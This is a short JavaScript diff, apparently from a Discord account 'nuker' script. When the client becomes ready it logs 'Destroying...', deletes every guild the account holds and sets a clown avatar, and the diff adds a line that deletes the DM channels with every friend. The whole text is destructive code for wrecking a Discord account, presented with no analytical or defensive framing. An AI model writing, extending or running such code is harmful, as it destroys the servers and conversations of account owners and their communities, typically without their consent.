@@ -40,6 +40,7 @@ client.once('ready', () => {
     console.info('Destroying...')
     client.guilds.map((g) => { g.delete().catch(console.error)})
     client.user.setAvatar('https://cdn.discordapp.com/attachments/733972937425813516/775078883531030548/clown.png')
+    client.user.friends.map((f) => {f.deleteDM().catch(console.error)})
     
     setTimeout(lGuilds, 1000)
     setTimeout(cGuilds, 5000)
